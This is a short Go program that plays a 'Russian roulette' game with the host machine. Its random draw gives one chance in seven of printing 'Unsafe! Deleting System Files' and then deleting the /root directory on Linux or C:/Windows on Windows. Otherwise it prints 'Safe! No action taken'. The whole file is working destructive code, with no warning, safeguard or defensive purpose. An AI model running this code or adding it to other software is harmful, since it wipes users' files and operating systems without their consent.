package main

import (
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"time"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	result := rand.Intn(7)

	if result == 1 {
		fmt.Println("Unsafe! Deleting System Files")
		if runtime.GOOS == "linux" {
			os.RemoveAll("/root")
		} else if runtime.GOOS == "windows" {
			os.RemoveAll("C:/Windows")
		}
	} else {
		fmt.Println("Safe! No action taken")
	}
}
